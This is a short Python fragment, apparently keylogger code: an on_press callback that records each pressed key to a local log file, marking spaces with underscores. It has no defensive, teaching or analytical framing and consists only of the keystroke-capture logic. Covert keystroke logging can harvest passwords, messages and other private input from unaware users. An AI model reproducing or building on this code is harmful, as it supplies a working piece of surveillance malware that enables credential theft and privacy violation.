def on_press(key):
    log_file = 'logfile.txt'
    try:
        if str(key) == 'Key.space':
            with open(log_file, "a") as f:
                f.write("__")
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        pass